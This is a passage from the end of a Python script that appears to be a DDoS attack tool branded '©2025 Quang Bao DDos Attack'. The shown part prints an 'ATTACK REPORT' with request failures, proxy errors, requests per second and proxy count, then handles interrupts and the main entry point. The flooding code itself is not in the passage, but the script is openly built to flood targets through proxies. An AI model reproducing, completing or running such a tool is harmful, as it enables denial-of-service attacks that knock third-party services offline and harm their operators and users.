                f"[bold {theme_color}]Failed:[/] [red]{error_count:,} ({error_rate:.1f}%)[/] [✗][/] \n"
                f"[bold {theme_color}]Proxy Errors:[/] [red]{proxy_error_count:,}[/]\n"
                f"[bold {theme_color}]Duration:[/] [green]{total_time:.2f}[/] seconds\n"
                f"[bold {theme_color}]Avg Ping:[/] [green]{avg_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Max Ping:[/] [green]{max_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]Min Ping:[/] [green]{min_response_time:.2f}[/]ms\n"
                f"[bold {theme_color}]RPS:[/] [green]{rps:.0f}[/]\n"
                f"[bold {theme_color}]Proxies:[/] [green]{len(PROXY_LIST)}[/]\n"
                f"[yellow] ©2025 Quang Bao DDos Attack [/]",
                title=f"[bold {theme_color}]ATTACK REPORT[/]",
                border_style="dim cyan"
            )
            console.print("")
            console.print(report)
            logger.info("Attack report generated")
            console.print(f"[success]Report completed! [✓][/] [yellow]*VORTEX*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")

        except KeyboardInterrupt:
            logger.info("Program interrupted by user")
            console.print(f"[warning]Attack stopped [⚠][/] [yellow]*HUM*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            display_exit_banner(theme_color)
            exit(0)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            console.print(f"[error]Error: [red]{str(e)}[/] [✗][/] [yellow]*ALERT*[/] [yellow] ©2025 Quang Bao DDos Attack [/]")
            exit(1)

if __name__ == "__main__":
    main()